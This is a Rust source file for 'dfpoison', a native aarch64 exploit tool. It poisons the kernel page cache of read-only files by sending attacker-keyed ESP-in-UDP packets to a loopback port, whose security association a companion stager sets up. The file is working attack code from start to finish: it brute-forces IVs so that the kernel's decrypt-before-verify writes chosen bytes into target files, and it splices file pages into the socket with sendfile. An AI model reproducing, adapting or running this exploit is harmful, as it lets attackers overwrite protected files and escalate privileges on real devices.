// dfpoison — native aarch64 Dirty-Frag page-cache poison (replaces the Java Writer JVMs).
// Sends attacker-keyed ESP-in-UDP to a loopback encap port whose SA was staged by the Java Stager;
// the kernel's decrypt-before-verify writes the chosen plaintext into the target file's page cache.
// No JVM (~ms startup vs ~0.6s ART cold start). Dep-free: bionic libc via hand-declared externs.
//
// usage: dfpoison <port> <spi_hex> <keymat_base_hex> (<targetfile> <specfile>)...
//   spec = 5-byte records: u32 LE offset + u8 desired-value. Prints "wrote=N skipped=M".
#![allow(non_camel_case_types)]
mod aes;
use aes::keystream0;

type c_int = i32;
type c_uint = u32;
type ssize_t = isize;
type size_t = usize;

extern "C" {
    fn socket(domain: c_int, ty: c_int, proto: c_int) -> c_int;
    fn connect(fd: c_int, addr: *const u8, len: c_uint) -> c_int;
    fn setsockopt(fd: c_int, level: c_int, name: c_int, val: *const u8, len: c_uint) -> c_int;
    fn open(path: *const u8, flags: c_int) -> c_int;
    fn pread(fd: c_int, buf: *mut u8, count: size_t, offset: i64) -> ssize_t;
    fn sendto(fd: c_int, buf: *const u8, len: size_t, flags: c_int, addr: *const u8, alen: c_uint) -> ssize_t;
    fn sendfile(out_fd: c_int, in_fd: c_int, offset: *mut i64, count: size_t) -> ssize_t;
    fn close(fd: c_int) -> c_int;
    fn usleep(usec: c_uint) -> c_int;
}

const AF_INET: c_int = 2;
const SOCK_DGRAM: c_int = 2;
const SOL_SOCKET: c_int = 1;
const SO_SNDBUF: c_int = 7;
const O_RDONLY: c_int = 0;
const MSG_MORE: c_int = 0x8000;
static EMPTY: [u8; 1] = [0];

struct Rng(u64);
impl Rng {
    fn next8(&mut self) -> [u8; 8] {
        let mut x = self.0;
        x ^= x >> 12; x ^= x << 25; x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545F4914F6CDD1D).to_le_bytes()
    }
}

fn die(m: &str) -> ! { eprintln!("dfpoison: {}", m); std::process::exit(1); }
fn hx(s: &str) -> u64 {
    if let Some(h) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u64::from_str_radix(h, 16).unwrap_or_else(|_| die("bad hex"))
    } else {
        s.parse().unwrap_or_else(|_| die("bad number"))
    }
}

fn main() {
    let a: Vec<String> = std::env::args().collect();
    if a.len() < 6 || (a.len() - 4) % 2 != 0 {
        die("usage: dfpoison <port> <spi> <keymat_base> (<file> <spec>)...");
    }
    let port = hx(&a[1]) as u16;
    let spi = hx(&a[2]) as u32;
    let keymat_base = hx(&a[3]) as u8;
    let ks0 = keystream0(keymat_base);

    // one reusable sending socket, connected to the loopback encap port
    let sk = unsafe { socket(AF_INET, SOCK_DGRAM, 0) };
    if sk < 0 { die("socket"); }
    let sndbuf: c_int = 4 << 20;
    unsafe { setsockopt(sk, SOL_SOCKET, SO_SNDBUF, &sndbuf as *const c_int as *const u8, 4); }
    let mut sa = [0u8; 16];
    sa[0] = AF_INET as u8;                 // sin_family (host-endian u16 low byte)
    sa[2..4].copy_from_slice(&port.to_be_bytes());   // sin_port (BE)
    sa[4..8].copy_from_slice(&[127, 0, 0, 1]);       // 127.0.0.1
    if unsafe { connect(sk, sa.as_ptr(), 16) } < 0 { die("connect"); }

    let mut rng = Rng(0xC0FFEE_1234_5678);
    let mut wrote = 0u64;
    let mut skipped = 0u64;

    let mut i = 4;
    while i + 1 < a.len() {
        let path = &a[i];
        let spec = std::fs::read(&a[i + 1]).unwrap_or_else(|e| die(&format!("read spec {}: {}", a[i + 1], e)));
        i += 2;
        let mut cpath: Vec<u8> = path.as_bytes().to_vec(); cpath.push(0);
        let f = unsafe { open(cpath.as_ptr(), O_RDONLY) };
        if f < 0 { die(&format!("open {}", path)); }
        let nrec = spec.len() / 5;
        for k in 0..nrec {
            let off = u32::from_le_bytes([spec[k*5], spec[k*5+1], spec[k*5+2], spec[k*5+3]]);
            let want = spec[k*5+4];
            let mut cur = [0u8; 1];
            if unsafe { pread(f, cur.as_mut_ptr(), 1, off as i64) } != 1 { die(&format!("pread @{}", off)); }
            if cur[0] == want { skipped += 1; continue; }
            let need = cur[0] ^ want;
            let iv = loop { let iv = rng.next8(); if ks0(&iv) == need { break iv; } };
            let mut hdr = [0u8; 16];
            hdr[0..4].copy_from_slice(&spi.to_be_bytes());
            hdr[7] = 1;
            hdr[8..16].copy_from_slice(&iv);
            let mut tries = 0;
            loop {
                let a1 = unsafe { sendto(sk, hdr.as_ptr(), 16, MSG_MORE, std::ptr::null(), 0) };
                let e1 = std::io::Error::last_os_error();
                let mut o: i64 = off as i64;
                let a2 = unsafe { sendfile(sk, f, &mut o as *mut i64, 17) };
                let a3 = unsafe { sendto(sk, EMPTY.as_ptr(), 0, 0, std::ptr::null(), 0) };
                if a1 == 16 && a2 == 17 && a3 >= 0 { break; }
                unsafe { sendto(sk, EMPTY.as_ptr(), 0, 0, std::ptr::null(), 0); } // flush any cork
                tries += 1;
                if tries > 3 { die(&format!("send failed @{} (a1={} a2={} a3={}) errno1={}", off, a1, a2, a3, e1)); }
                unsafe { usleep(2000); }
            }
            wrote += 1;
            if wrote & 63 == 0 { unsafe { usleep(1000); } } // burst cap 64 (matches Writer)
        }
        unsafe { close(f); }
    }
    unsafe { close(sk); }
    println!("wrote={} skipped={}", wrote, skipped);
}
